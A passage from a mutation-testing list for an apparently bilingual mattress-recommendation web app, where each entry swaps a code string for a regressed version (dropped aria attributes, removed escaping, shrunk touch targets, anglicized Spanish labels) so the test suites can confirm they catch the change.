    "+ _plainLead()\n      + _plainBrief(priorityLines)\n      + (priorityLines ? 'What we will test together:",
    CONSULT, "Code.gs"],
  ["Code.gs: the ES plain branch drops the consultation lines",
    "+ _plainLead()\n      + _plainBrief(priorityLines)\n      + consultBlock\n      + (priorityLines ? 'Lo que probaremos juntos:",
    "+ _plainLead()\n      + _plainBrief(priorityLines)\n      + (priorityLines ? 'Lo que probaremos juntos:",
    CONSULT, "Code.gs"],
  ["Code.gs: the HTML part drops the consultation lines",
    "+ consultLines.map(function(line) {",
    "+ [].map(function(line) {",
    CONSULT, "Code.gs"],
  ["Code.gs: the consultation projection becomes a passthrough",
    "consultation: (function(cs) {\n        var pick = function(v) { var t = typeof v === 'string' ? v.trim() : ''; return t ? _safeText(t, 300) : ''; };\n        return {\n          context: pick(cs && cs.context),\n          who: pick(cs && cs.who),\n          profile: pick(cs && cs.profile)\n        };\n      })(data.consultation),",
    "consultation: (data.consultation && typeof data.consultation === 'object') ? data.consultation : {},",
    CONSULT, "Code.gs"],
  // Adversarial finding F6: these three properties each had exactly ONE
  // observing assertion and NO mutation of their own, so deleting the
  // assertion would have left them untested while the sweep stayed green.
  ["Code.gs: the consultation bound is widened 100x",
    "var pick = function(v) { var t = typeof v === 'string' ? v.trim() : ''; return t ? _safeText(t, 300) : ''; };",
    "var pick = function(v) { var t = typeof v === 'string' ? v.trim() : ''; return t ? _safeText(t, 30000) : ''; };",
    CONSULT, "Code.gs"],
  // Codex (PR #17 final review): the SERVER half of the blank-only rule -
  // this mutant restores the pre-review pick that bounded without trimming,
  // so "   " arrives truthy and renders an empty line in both MIME parts.
  ["Code.gs: blank-only consultation fields render anyway",
    "var pick = function(v) { var t = typeof v === 'string' ? v.trim() : ''; return t ? _safeText(t, 300) : ''; };",
    "var pick = function(v) { return typeof v === 'string' ? _safeText(v, 300) : ''; };",
    CONSULT, "Code.gs"],
  ["Code.gs: the HTML part stops escaping the consultation lines",
    ".map(function(s) { return _escapeHtml(s); })",
    ".map(function(s) { return String(s == null ? '' : s); })",
    CONSULT, "Code.gs"],
  ["Code.gs: the plain part stops stripping consultation angle brackets",
    ".map(function(s) { return _plainPriority(s); })",
    ".map(function(s) { return String(s || ''); })",
    CONSULT, "Code.gs"],
  ["Code.gs: the sheet row grows the consultation content",
    "      rsa\n    ]);",
    "      rsa,\n      JSON.stringify(data.consultation || '')\n    ]);",
    CONSULT, "Code.gs"],
  // --- compare-modal dialog semantics (the alignment prerequisite) ---------
  // Every anchor is compare-specific so none can alias onto the financing
  // sheet's byte-identical wrap/label implementation (that aliasing was a
  // real mistake caught during PR #30's scratch mutation pass).
  // --- Item 1.3 reason-gate containment (owner ruling 2026-08-24) ----------
  // Each entry REINTRODUCES a contained gated output. The gate fails closed by
  // omission, so a re-introduction must turn the suites red - otherwise the
  // containment assertions are decorative.
  ["1.3 containment: the drawer why-fit heading element returns",
    '        <div class="drawer-section-label" id="drawerDifferentiatorsLabel">What makes this one different</div>',
    '        <div class="drawer-section-label" id="drawerWhyLabel">Why it made your shortlist</div>\n        <div class="drawer-section-label" id="drawerDifferentiatorsLabel">What makes this one different</div>',
    RESULTS],
  ["1.3 containment: the drawer answer-derived why-fit container returns",
    '        <div class="drawer-differentiators" id="drawerDifferentiators"></div>',
    '        <div class="drawer-shortlist-fit" id="drawerShortlistFit"></div>\n        <div class="drawer-differentiators" id="drawerDifferentiators"></div>',
    RESULTS],
  ["1.3 containment: a renderer calls the why-fit producer again",
    "      // Item 1.3 reason-gate containment (2026-08-24): the why-fit label and",
    "      var _reintroduced = mattressShortlistFitText(m);\n      // Item 1.3 reason-gate containment (2026-08-24): the why-fit label and",
    RESULTS],
  ["1.3 containment: the Compare why-fit row returns",
    "          { key: 'feature', label: _esCmp ? 'Característica clave' : 'Key feature', a: a.feature, b: b.feature, emphasis: true },",
    "          { key: 'fit', label: _esCmp ? 'Por qué está aquí' : 'Why it is here', a: a.fit, b: b.fit },\n          { key: 'feature', label: _esCmp ? 'Característica clave' : 'Key feature', a: a.feature, b: b.feature, emphasis: true },",
    COMPARE],
  ["compare modal: dialog semantics removed",
    '<div id="compareModal" class="compare-modal" style="display:none;" role="dialog"\n       aria-modal="true" aria-labelledby="compareModalTitle">',
    '<div id="compareModal" class="compare-modal" style="display:none;">', COMPARE],
  ["compare modal: initial title focus removed",
    "modal.classList.add('visible');\n      if (title && typeof title.focus === 'function') {",
    "modal.classList.add('visible');\n      if (false) {", COMPARE],
  ["compare modal: Escape handling removed",
    "if (e.key === 'Escape') { e.preventDefault(); window.closeCompareModal(); return; }",
    "if (false) { return; }", COMPARE],
  ["compare modal: Shift+Tab wrap removed",
    "return el.offsetParent !== null && el.disabled !== true;\n      });\n      if (!list.length) return;\n      var first = list[0], last = list[list.length - 1];\n      if (e.shiftKey && document.activeElement === first) {\n        e.preventDefault(); last.focus();\n      } else if (!e.shiftKey && document.activeElement === last) {",
    "return el.offsetParent !== null && el.disabled !== true;\n      });\n      if (!list.length) return;\n      var first = list[0], last = list[list.length - 1];\n      if (!e.shiftKey && document.activeElement === last) {", COMPARE],
  ["compare modal: focus restoration removed",
    "try { opener.focus({ preventScroll: true }); } catch (err) { opener.focus(); }",
    "if (false) {}", COMPARE],
  ["compare modal: close-label localization removed",
    "closeBtn.setAttribute('aria-label',\n          currentLang === 'es' ? 'Cerrar comparación' : 'Close comparison');",
    "closeBtn.setAttribute('data-nope',\n          currentLang === 'es' ? 'Cerrar comparación' : 'Close comparison');", COMPARE],
  ["compare modal: wipe null-before-close ordering reversed",
    "window._compareReturnFocus = null;\n        if (typeof window.closeCompareModal === 'function') window.closeCompareModal();",
    "if (typeof window.closeCompareModal === 'function') window.closeCompareModal();\n        window._compareReturnFocus = null;", COMPARE],

  // --- static comparison alignment (owner-approved slice) ------------------
  ["compare alignment: the head row regresses to independent columns",
    "'<div class=\"cmp-head-row\" role=\"row\"><div class=\"cmp-label\" role=\"columnheader\"></div>' + a.head + b.head + '</div>'",
    "''", COMPARE],
  // Re-pointed 2026-08-12 (claim-retirement slice): the two lines gained the
  // retired-model "—" ternary, so the find-strings moved with the code. The
  // mutation semantics are IDENTICAL — drop the d0 term and the compare
  // suite must notice the title/benefit vanish.
  ["compare alignment: the key-feature title is dropped again",
    "feature: _retired ? '—' : (d0.title || mattressResponseLabel(m)),",
    "feature: _retired ? '—' : (d0.detail || mattressResponseLabel(m)),", COMPARE],
  ["compare alignment: the practical benefit is dropped",
    "benefit: _retired ? '—' : (d0.detail || mattressDifferenceText(m)),",
    "benefit: _retired ? '—' : (mattressDifferenceText(m)),", COMPARE],
  ["compare alignment: identical values no longer merge",
    "if (r.a === r.b) {", "if (false) {", COMPARE],
  ["compare alignment: difference emphasis removed",
    "' cmp-row--diff\" role=\"row\" data-cmp=\"'", "' \" role=\"row\" data-cmp=\"'", COMPARE],
  ["compare alignment: the Spanish key-feature label removed",
    "_esCmp ? 'Característica clave' : 'Key feature'", "'Key feature'", COMPARE],

  // --- comparison table associations (a11y correction) ---------------------
  ["compare alignment a11y: the table role is removed",
    "role=\"table\" aria-labelledby=\"compareModalTitle\"", "", COMPARE],
  ["compare alignment a11y: mattress column headers demoted to plain divs",
    "'<div class=\"cmp-head\" role=\"columnheader\">'", "'<div class=\"cmp-head\">'", COMPARE],
  ["compare alignment a11y: the merged-row header is demoted",
    "cmp-row--same\" role=\"row\" data-cmp=\"' + r.key + '\">'\n                  + '<div class=\"cmp-label\" role=\"rowheader\">'",
    "cmp-row--same\" role=\"row\" data-cmp=\"' + r.key + '\">'\n                  + '<div class=\"cmp-label\">'", COMPARE],
  ["compare alignment a11y: the merged cell loses its column span",
    "role=\"cell\" aria-colspan=\"2\"", "role=\"cell\"", COMPARE],

  // --- construction reveal repair + two-role reframe (slices 5a+5b) --------
  ["cons repair: the light-drawer palette override is removed",
    "body:has(#resultsScreen.active) .dfm-cons {\n      --dfm-cons-ink: #7D5B34;\n      --dfm-cons-wash: #F3EADB;\n      --dfm-cons-edge: #9A7445;\n    }",
    "", CONS],
  ["cons repair: a coil-reading motif returns to a region",
    ".dfm-cons-fill--support { background: repeating-linear-gradient(45deg, var(--dfm-cons-ink) 0 5px, var(--dfm-cons-wash) 5px 11px); }",
    ".dfm-cons-fill--support { background: repeating-radial-gradient(circle at 8px 8px, var(--dfm-cons-ink) 0 2px, var(--dfm-cons-wash) 2px 10px); }",
    CONS],
  ["cons 5b: one role explanation goes blank",
    "['Support', 'The deeper structure that holds you up.']",
    "['Support', '']", CONS],
  ["cons 5b: markup varies by model (generic boundary broken)",
    "'<div class=\"drawer-section-label\">' + heading + '</div>' +\n        '<div class=\"dfm-cons\" id=\"dfmConstructionPanel\">' +",
    "'<div class=\"drawer-section-label\">' + heading + (((window.currentDrawerMattress || {}).id) || '') + '</div>' +\n        '<div class=\"dfm-cons\" id=\"dfmConstructionPanel\">' +",
    CONS],
  ["cons 5b: markup reads product data (no-product-data rule)",
    "var keys = ['comfort', 'support'];",
    "var keys = ['comfort', 'support']; var _f = window.currentDrawerMattress && window.currentDrawerMattress.firmness;",
    CONS],
  ["cons 5b: a swatch stops matching its region",
    "'<dt><span class=\"dfm-cons-swatch dfm-cons-fill--' + keys[i] + '\" aria-hidden=\"true\"></span>'",
    "'<dt><span class=\"dfm-cons-swatch dfm-cons-fill--' + keys[0] + '\" aria-hidden=\"true\"></span>'",
    CONS],
  ["cons 5b: the forced-colors fallback is removed",
    "@media (forced-colors: active) {\n      .dfm-cons-region, .dfm-cons-swatch { border-width: 3px; }\n      .dfm-cons-fill--comfort { border-style: solid; }\n      .dfm-cons-fill--support { border-style: double; }\n    }",
    "", CONS],
  ["cons 5b: the forced-colors region styles lose their distinction",
    ".dfm-cons-fill--support { border-style: double; }",
    ".dfm-cons-fill--support { border-style: solid; }", CONS],
  ["cons 5b: collapsed roles regress to opacity-only hiding",
    "color: inherit;\n      opacity: 0;\n      visibility: hidden;\n    }\n    .dfm-cons.is-open .dfm-cons-roles { opacity: 1; visibility: visible; }",
    "color: inherit;\n      opacity: 0;\n    }\n    .dfm-cons.is-open .dfm-cons-roles { opacity: 1; visibility: visible; }",
    CONS],
  ["cons 5b: reduced motion no longer opens the demonstration",
    "if (dfmReducedMotion()) setState(true);", "", CONS],

  // --- compare entry point (owner-authorized slice) ------------------------
  // (Slice 5 C2: the clusters gained the finalist control between compare and
  // save; the find-strings follow the new shape.)
  ["compare entry: the top-pick card loses its compare control",
    "+       detailsBtn\n        +       compareBtn\n        +       finalistBtn\n        +       saveBtn",
    "+       detailsBtn\n        +       finalistBtn\n        +       saveBtn", CMPE],
  ["compare entry: the supporting cards lose their compare control",
    "+       detailsBtn\n          +       compareBtn\n          +       finalistBtn\n          +       saveBtn",
    "+       detailsBtn\n          +       finalistBtn\n          +       saveBtn", CMPE],
  ["compare entry: the tray go label loses its Spanish draft",
    "go.textContent = currentLang === 'es' ? 'Comparar →' : 'Compare →';",
    "go.textContent = 'Compare →';", CMPE],
  ["compare entry: the two-selection cap is removed",
    "if (arr.length >= 2) return; // soft cap at 2",
    "if (false) return;", CMPE],
  // X1 (North Star D9, 2026-08-31): the pill lifts above the shown tray.
  ["X1: the pill stops lifting above the compare tray (class toggle dropped)",
    "        btn.classList.toggle('noct-picks-pill--lifted', total > 0 && trayShown);",
    "", CMPE],
  ["X1: the lift stops following the tray's rendered height (constant clearance)",
    "          if (trayShown) btn.style.setProperty('--df-tray-clearance', tray.offsetHeight + 'px');",
    "          if (trayShown) btn.style.setProperty('--df-tray-clearance', '61px');", CMPE],
  ["X1: updateCompareTray() measures the lift before the slots render",
    "      go.disabled = arr.length < 2;\n      // X1: the pill lifts above the shown tray, measured AFTER the slots and\n      // labels render (the ES chips wrap and change the tray's height).\n      if (typeof window._updatePicksBadge === 'function') window._updatePicksBadge();",
    "      go.disabled = arr.length < 2;", CMPE],
  ["X1: the lift rule is removed from the stylesheet",
    "    .noct-picks-pill--lifted {\n      bottom: calc(1rem + var(--df-tray-clearance, 64px) + 8px);\n    }",
    "", CMPE],
  ["X1: the wipe registry forgets the lifted class",
    "{ id: 'savedPicksBtn', remove: ['noct-picks-pill--visible', 'noct-picks-pill--lifted'] }",
    "{ id: 'savedPicksBtn', remove: ['noct-picks-pill--visible'] }", CMPE],
  ["compare entry: toggle stops announcing state (aria-pressed dropped)",
    "btn.classList.toggle('selected', on);\n        btn.setAttribute('aria-pressed', on ? 'true' : 'false');",
    "btn.classList.toggle('selected', on);", CMPE],
  ["compare entry: clear stops announcing state (aria-pressed dropped)",
    "b.classList.remove('selected');\n        b.setAttribute('aria-pressed', 'false');",
    "b.classList.remove('selected');", CMPE],
  ["compare entry: a compare tap falls through and opens the drawer",
    "var cmpBtn = e.target.closest('.compare-btn');",
    "var cmpBtn = null;", CMPE],
  ["compare entry: the session wipe keeps the previous customer's selection",
    "window._favoriteMattressId = '';\n        window._compareSelected = [];",
    "window._favoriteMattressId = '';", CMPE],
  ["compare modal: the aligned table loses its light theme (cream on cream)",
    "body:has(#resultsScreen.active) .cmp-head-name,\n    body:has(#hf2Screen.active) .cmp-head-name,\n    body:has(#resultsScreen.active) .cmp-val,\n    body:has(#hf2Screen.active) .cmp-val {\n      color: #2F271E;\n    }",
    "", CMPE],
  ["compare tray: reduced motion regains the entrance slide",
    "@media (prefers-reduced-motion: reduce) {\n      .compare-tray { animation: none; }\n    }",
    "", CMPE],
  ["compare modal: title and price tier regress to root gold (~2.8:1)",
    "body:has(#resultsScreen.active) #compareModalTitle,\n    body:has(#hf2Screen.active) #compareModalTitle {\n      --gold: #7D5B34;\n    }\n    body:has(#resultsScreen.active) .cmp-head-name .price-tier,\n    body:has(#hf2Screen.active) .cmp-head-name .price-tier {\n      color: #7D5B34;\n    }",
    "", CMPE],

  // --- Sleep Brief CTA relabel (owner-authorized 2026-08-10) ---------------
  // The label pair is ruled verbatim and the handler must keep routing to the
  // results reveal. Anchored on the CTA's own ternary and its own button
  // markup — nothing else in the file shares either string.
  ["sleep brief CTA: the EN label reverts to the pre-relabel Compare claim",
    "ctaBtn.textContent = es ? 'Ver Mis Opciones →' : 'See My Matches →';",
    "ctaBtn.textContent = es ? 'Ver Mis Opciones →' : 'Compare My Matches →';",
    PRIORITIES],
  ["sleep brief CTA: the ES label reverts to the pre-relabel Compare claim",
    "ctaBtn.textContent = es ? 'Ver Mis Opciones →' : 'See My Matches →';",
    "ctaBtn.textContent = es ? 'Comparar Mis Opciones →' : 'See My Matches →';",
    PRIORITIES],
  ["sleep brief CTA: the handler repoints at the comparison opener",
    'id="profileCta" onclick="window.startResultsReveal()" ontouchend="event.preventDefault();window.startResultsReveal();"',
    'id="profileCta" onclick="window.compareReviewFinalists()" ontouchend="event.preventDefault();window.compareReviewFinalists();"',
    PRIORITIES],

  // --- PR 1 integrity repairs (2026-08-13) ---------------------------------
  // The deployment has no inventory data source, so a returning stock claim
  // is a fabricated claim; the RSA-panel entry reverting to a class strip is
  // the wipe no-op this repair removed.
  ["a hardcoded stock claim returns to the top-pick card",
    "'<div class=\"noct-toppick-actions\">'\n        +     '<div class=\"noct-card-action-cluster\">'",
    "'<div class=\"noct-toppick-actions\">'\n        +     '<div class=\"noct-toppick-stock\">In stock</div>'\n        +     '<div class=\"noct-card-action-cluster\">'",
    INTEGRITY],
  ["the RSA panel wipe entry reverts to the is-open class strip",
    "{ id: 'hf2RsaPanel', hiddenAttr: true },",
    "{ id: 'hf2RsaPanel', remove: ['is-open'] },",
    INTEGRITY],

  // --- Results presentation (Slice 1, 2026-08-14) --------------------------
  // D3: index-only hierarchy at the engine's own cap, ruled dict labels, the
  // relativity line, restyled 44px tabs with real selected-state semantics,
  // no buyer labels, no provenance, no synthesized priority rows on cards.
  ["results: the hero renders a different index than the engine's first entry",
    "renderTopPickCard(list[0], tier);",
    "renderTopPickCard(list[list.length - 1], tier);", RESULTS],
  ["results: the support cards render in reversed order",
    "renderSupportingCards(supports, tier);",
    "renderSupportingCards(supports.slice().reverse(), tier);", RESULTS],
  ["results: the supports are predicate-filtered on meetsMatchThreshold",
    "var supports = list.slice(1);",
    "var supports = list.slice(1).filter(function(m){ return m.meetsMatchThreshold; });",
    RESULTS],
  ["results: the presentation layer re-applies the engine cap",
    "var supports = list.slice(1);",
    "var supports = list.slice(1, 3);", RESULTS],
  // C5 (cohesion pass-1, 2026-08-30): count-aware nouns on the Selections
  // pill and the take-home packet.
  ["C5: the Selections pill regresses to a static plural beside a live count",
    "      return t(total === 1 ? 'header.picks_one' : 'header.picks');",
    "      return t('header.picks');", RESULTS],
  ["C5: the Spanish pill label regresses to \"Favoritos\" (disagreeing with its accessible name)",
    "\"header.picks\": \"Selecciones\"",
    "\"header.picks\": \"Favoritos\"", RESULTS, "data/dict-es.json"],
  ["C5: the take-home Spanish saved count loses its singular (\"1 guardados\")",
    "(savedMattresses.length === 1 ? ' guardado' : ' guardados')",
    "' guardados'", RESULTS],
  ["C5: a language switch stops re-deriving the pill noun from the count",
    "        picksLabel.textContent = window._picksPillLabel(\n          parseInt(picksCountEl && picksCountEl.textContent, 10) || 0);",
    "        picksLabel.textContent = t('header.picks');", RESULTS],
  ["results: the ordinal role label reads pct off the item",
    "var ordinalKey = i === 0 ? 'results.match_second'",
    "var ordinalKey = (m.pct >= 90) ? null : i === 0 ? 'results.match_second'",
    RESULTS],
  ["results: the lead role label conditions on meetsMatchThreshold",
    "escapeHtml(t('results.match_lead'))",
    "escapeHtml(m.meetsMatchThreshold ? t('results.match_lead') : '')", RESULTS],
  ["results: the tier tab stops announcing its selected state",
    "          + ' aria-pressed=\"' + (isActive ? 'true' : 'false') + '\"'\n",
    "", RESULTS],
  ["results: the tier tab falls below the 44px touch floor",
    "      min-height: 44px;\n      padding: 10px 20px 10px 24px;",
    "      padding: 10px 20px 10px 24px;", RESULTS],
  ["results: the relativity line is dropped from the tier descriptor",
    "      html += '<span class=\"tier-relativity\">' + escapeHtml(t('results.match_relativity')) + '</span>';\n",
    "", RESULTS],
  ["results: the Spanish relativity line is silently anglicized",
    "\"results.match_relativity\": \"La afinidad es relativa dentro de cada nivel\"",
    "\"results.match_relativity\": \"Match strength is relative within each tier\"",
    RESULTS, "data/dict-es.json"],
  ["results: a fabricated reason fallback stands in for missing catalog content",
    "      var reasonHtml = reason\n        ? '<p class=\"noct-toppick-reason\">' + escapeHtml(reason) + '</p>'\n        : '';",
    "      var reasonHtml = '<p class=\"noct-toppick-reason\">' + escapeHtml(reason || (es ? 'Ideal para ti' : 'A great fit for you')) + '</p>';",
    RESULTS],
  ["results: an origin/provenance chip returns to the lead card",
    "        +   '<div class=\"noct-toppick-brand\">' + escapeHtml(brandLine) + '</div>'",
    "        +   (m.locallyMade ? '<div class=\"noct-origin-chip\">Made in Texas</div>' : '')\n        +   '<div class=\"noct-toppick-brand\">' + escapeHtml(brandLine) + '</div>'",
    RESULTS],
  ["results: the promotion badges hook is removed from the support cards",
    "          +   promotionBadgesHtml(m)\n",
    "", RESULTS],
  ["results: the promotion offer tab hook is removed from the lead card",
    "        + promotionOfferTabHtml(promotion)\n        + img",
    "        + img", RESULTS],
  ["results: tier_view logs a hardcoded tier instead of the viewed one",
    "        analytics.log('tier_view', { tier: tier });",
    "        analytics.log('tier_view', { tier: 'gold' });", RESULTS],
  ["results: the tier tap strands keyboard focus on the detached tab",
    "      var tab = document.getElementById('tierTab-' + tier);\n      if (tab) { try { tab.focus({ preventScroll: true }); } catch (err) { tab.focus(); } }\n",
    "", RESULTS],

  // --- Slice 2: the Sleep Signature constellation (D2) ---------------------
  ["constellation: the geometry goes nondeterministic",
    "        var angle = (Math.PI * 2 * i) / dims.length - Math.PI / 2;",
    "        var angle = (Math.PI * 2 * i) / dims.length - Math.PI / 2 + Math.random() * 0.01;",
    BRIEF],
  ["constellation: the decorative shield is dropped",
    "viewBox=\"0 0 120 120\" aria-hidden=\"true\" focusable=\"false\"",
    "viewBox=\"0 0 120 120\"", BRIEF],

  // --- Slice 2: the D1 Sleep Brief composition ----------------------------
  ["brief: the heading stops resolving from the governed dictionary",
    "setProfileText('profileName', t('brief.heading'));",
    "setProfileText('profileName', 'Your Sleep Brief');", BRIEF],
  ["brief: the ruled hero message is dropped from beneath the heading",
    "      setProfileText('profileHero', t('brief.hero'));\n", "", BRIEF],
  ["brief: the answer-derived subtitle returns to the customer-visible DOM",
    "        <p class=\"noct-profile-hero\" id=\"profileHero\"></p>\n",
    "        <p class=\"noct-profile-hero\" id=\"profileHero\"></p>\n        <div id=\"profileSubtitle\"></div>\n",
    BRIEF],
  ["brief: every disclosure opens at once (single-open contract lost)",
    "          var open = _briefOpenPriority === i;", "          var open = true;", BRIEF],
  ["brief: a revised quiz completion inherits the previous open disclosure",
    "      _briefOpenPriority = null;\n", "", BRIEF],
  ["brief: opening a second priority stops closing the first",
    "      _briefOpenPriority = (_briefOpenPriority === index) ? null : index;",
    "      _briefOpenPriority = index;", BRIEF],
  ["brief: the disclosure stops announcing its state",
    "            + ' aria-expanded=\"' + (open ? 'true' : 'false') + '\"'\n", "", BRIEF],
  ["brief: the testing prose leaves the disclosure panel",
    "            + '<p class=\"noct-profile-priority-test\"><strong>' + escapeHtml(t('brief.try_this')) + '</strong>' + escapeHtml(p.test) + '</p>'\n",
    "", BRIEF],
  ["brief: the reason prose leaves the disclosure panel",
    "            + '<p class=\"noct-profile-priority-why\">' + escapeHtml(p.why) + '</p>'\n",
    "", BRIEF],
  ["brief: the disclosure toggle falls below the 44px touch floor",
    "      min-width: 44px;\n      min-height: 44px;\n      padding: 11px 14px;",
    "      padding: 11px 14px;", BRIEF],
  ["brief: the focus destination suppresses its own indicator again",
    "      letter-spacing: -0.035em;\n      line-height: 0.98;\n    }",
    "      letter-spacing: -0.035em;\n      line-height: 0.98;\n      outline: none;\n    }", BRIEF],
  ["brief: the wipe stops owning the Sleep Signature containers",
    "      'profileName', 'profilePriorities', 'profileSignature', 'profileHero',",
    "      'profileName', 'profilePriorities', 'profileHero',", BRIEF],
  // --- Slice 2 device-gate repairs (2026-08-15) ---------------------------
  ["brief: the reveal starts before the Sleep Brief is painted (one frame, not two)",
    "          sessionFrame(function() {\n            sessionFrame(function() {\n              var el = document.getElementById('profileSignature');\n              if (el && el.classList) el.classList.add('is-entering');\n            });\n          });",
    "          sessionFrame(function() {\n              var el = document.getElementById('profileSignature');\n              if (el && el.classList) el.classList.add('is-entering');\n          });",
    BRIEF],
  ["brief: the hero constellation shrinks back to stamp scale",
    "      width: clamp(220px, 20vw, 260px);\n      margin-inline: auto;",
    "      width: clamp(132px, 15vw, 168px);\n      margin-inline: auto;", BRIEF],
  ["brief: portrait pins the card to the viewport again (dead band below the actions)",
    "        min-height: auto;\n        border: 0;",
    "        min-height: 100dvh;\n        border: 0;", BRIEF],
  ["brief: the portrait heading loses its clearance from the fixed controls",
    "        padding-top: calc(var(--session-utility-clearance) + env(safe-area-inset-top));\n",
    "", BRIEF],
  ["brief: the signature animates on every render, not just the quiz entry",
    "        window._sleepSignatureEntry = false;\n", "", BRIEF],
  ["brief: the Results header stamp stops sharing the answer-derived geometry",
    "      if (resultsSignature) resultsSignature.innerHTML = buildSleepSignatureSvg(answers);",
    "      if (resultsSignature) resultsSignature.innerHTML = '';", BRIEF],
  ["brief: the Consultation Summary stamp is dropped",
    "      if (hf2Signature) hf2Signature.innerHTML = buildSleepSignatureSvg(answers);\n",
    "", BRIEF],
  ["brief: the Spanish signature eyebrow is anglicized",
    "\"brief.signature_eyebrow\": \"Tu firma de sueño\",",
    "\"brief.signature_eyebrow\": \"Your sleep signature\",", BRIEF, "data/dict-es.json"],
  ["brief: the retained reveal fallback stops honoring reduced motion",
    "      if (dfmReducedMotion()) {\n        window._sleepSignatureEntry = true;\n        window.showProfileScreen();\n        return;\n      }\n      var elements = getConsultationRevealElements();",
    "      var elements = getConsultationRevealElements();", MOTION],

  // --- Slice 3: Quiz presentation -----------------------------------------
  // Rendering: the owner ruling is ZERO option icons, configured order, the
  // governed hide/skip semantics, and manual advance.
  ["quiz: an option icon is rendered into the customer UI",
    "<span class=\"opt-label\">${L(opt.label)}</span>",
    "<span class=\"opt-icon\">${opt.icon}</span><span class=\"opt-label\">${L(opt.label)}</span>", QUIZ],
  ["quiz: displayed option order is reversed",
    "${displayOptions.map(opt => {", "${displayOptions.slice().reverse().map(opt => {", QUIZ],
  ["quiz: hideIf filtering is neutralized",
    "!opt.hideIf || answers[opt.hideIf.question] !== opt.hideIf.answer", "true", QUIZ],
  ["quiz: selecting an option auto-advances",
    "      renderQuestion();\n      if (restoreId) {",
    "      renderQuestion();\n      nextQuestion();\n      if (restoreId) {", QUIZ],
  ["quiz: the three-selection cap is removed",
    "if (answers[qId].length >= 3) return;", "if (false) return;", QUIZ],
  ["quiz: \"None\" stops being exclusive",
    "if (optId === 'none') {", "if (false) {", QUIZ],
  ["quiz: the solo path stops stamping not_applicable",
    "answers[q.id] = 'not_applicable';", "", QUIZ],
  ["quiz: the stable option ids are removed",
    "                id=\"qopt-${q.id}-${opt.id}\"\n", "", QUIZ],

  // Selected-state semantics and its two non-color cues.
  ["quiz: aria-pressed is removed from the option buttons",
    "                aria-pressed=\"${isSel ? 'true' : 'false'}\"\n", "", QUIZ],
  ["quiz: aria-pressed is inverted",
    "aria-pressed=\"${isSel ? 'true' : 'false'}\"",
    "aria-pressed=\"${isSel ? 'false' : 'true'}\"", QUIZ],
  ["quiz: the selected state loses its geometric cue (back to colour alone)",
    "      border-width: 2px;\n      border-left-width: 6px;\n", "", QUIZ],
  ["quiz: the resting option stops reserving the rail (selection would reflow)",
    "      border-left: 6px solid transparent;\n", "", QUIZ],
  ["quiz: hover borrows the selected rail (an unselected option reads as chosen)",
    "        border-left-color: transparent;\n", "", QUIZ],
  // Forced-colors cue (repaired: the old (0,2,0) selector lost the cascade).
  ["quiz: the forced-colors selected cue is removed",
    "      body:has(#questionScreen.active) .noct-quiz-option.selected[aria-pressed=\"true\"] {\n        border-width: 3px;\n        border-left-width: 6px;\n        border-color: CanvasText;\n        padding: 18px 20px 18px 17px;\n      }\n",
    "", QUIZ],
  ["quiz: the forced-colors selected cue loses the cascade again (specificity dropped back to (0,2,0))",
    "      body:has(#questionScreen.active) .noct-quiz-option.selected[aria-pressed=\"true\"] {\n        border-width: 3px;",
    "      .noct-quiz-option[aria-pressed=\"true\"] {\n        border-width: 3px;", QUIZ],
  ["quiz: the forced RESTING boundary loses its explicit CanvasText colour (left edge falls back to the transparent base rail)",
    "        border-width: 1px;\n        border-color: CanvasText;\n        padding: 20px 22px;",
    "        border-width: 1px;\n        padding: 20px 22px;", QUIZ],
  ["quiz: the forced SELECTED boundary loses its explicit CanvasText colour (falls back to the author accent-ink)",
    "        border-left-width: 6px;\n        border-color: CanvasText;\n        padding: 18px 20px 18px 17px;",
    "        border-left-width: 6px;\n        padding: 18px 20px 18px 17px;", QUIZ],
  ["quiz: the forced boundary colour is swapped from a system colour to an author token",
    "        border-color: CanvasText;\n        padding: 20px 22px;",
    "        border-color: var(--accent-ink);\n        padding: 20px 22px;", QUIZ],
  ["quiz: forced colors goes back to relying on a transparent rail for the resting option",
    "      body:has(#questionScreen.active) .noct-quiz-option {\n        border-width: 1px;\n        border-color: CanvasText;\n        padding: 20px 22px;\n      }\n",
    "", QUIZ],
  ["quiz: the forced-colors selected padding stops compensating (text and box shift)",
    "        padding: 18px 20px 18px 17px;", "        padding: 19px 21px 19px 17px;", QUIZ],
  ["quiz: the narrow breakpoint loses its forced-colors geometry (wide rule wins there by order)",
    "    @media (forced-colors: active) and (max-width: 700px) {\n      body:has(#questionScreen.active) .noct-quiz-option {\n        padding: 17px 18px;\n      }\n",
    "    @media (forced-colors: active) and (max-width: 700px) {\n", QUIZ],
  ["quiz: the slider loses touch-action: manipulation (CLAUDE.md interactive-element rule)",
    "      touch-action: manipulation;\n    }\n\n    .noct-slider-track::-webkit-slider-thumb {",
    "    }\n\n    .noct-slider-track::-webkit-slider-thumb {", QUIZ],

  // Focus wiring: both halves of the shared contract.
  ["quiz: the five Quiz/Review controls (and the trust-gate headline) are dropped from the focus rule",
    "    .noct-profile-secondary:focus-visible,\n    .noct-quiz-headline:focus-visible,\n    .noct-quiz-option:focus-visible,\n    .noct-quiz-back:focus-visible,\n    .noct-quiz-next:focus-visible,\n    .noct-review-edit:focus-visible,\n    .noct-slider-track:focus-visible {\n      outline: 3px solid var(--focus-ring-outer);",
    "    .noct-profile-secondary:focus-visible {\n      outline: 3px solid var(--focus-ring-outer);", QUIZ],
  ["quiz: the five controls (and the trust-gate headline) are dropped from the forced-colors focus fallback",
    "      .noct-profile-secondary:focus-visible,\n      .noct-quiz-headline:focus-visible,\n      .noct-quiz-option:focus-visible,\n      .noct-quiz-back:focus-visible,\n      .noct-quiz-next:focus-visible,\n      .noct-review-edit:focus-visible,\n      .noct-slider-track:focus-visible {\n        outline-color: CanvasText;",
    "      .noct-profile-secondary:focus-visible {\n        outline-color: CanvasText;", QUIZ],

  // Every required 44px interaction floor, one entry each.
  ["quiz: the base option row drops below the 44px floor",
    "      gap: 4px;\n      min-height: 84px;", "      gap: 4px;\n      min-height: 24px;", QUIZ],
  ["quiz: the consultation option row drops below the 44px floor",
    "      min-height: 88px;\n      padding: 20px 22px 20px 17px;",
    "      min-height: 24px;\n      padding: 20px 22px 20px 17px;", QUIZ],
  ["quiz: Back drops below the 44px floor",
    "      padding: 8px 10px;\n      min-height: 44px;", "      padding: 8px 10px;", QUIZ],
  ["quiz: Next drops below the 44px floor",
    "      padding: 16px 32px;\n      font-family: var(--font-serif);",
    "      padding: 4px 32px;\n      font-family: var(--font-serif);", QUIZ],
  ["quiz: Review Edit drops below the 44px floor",
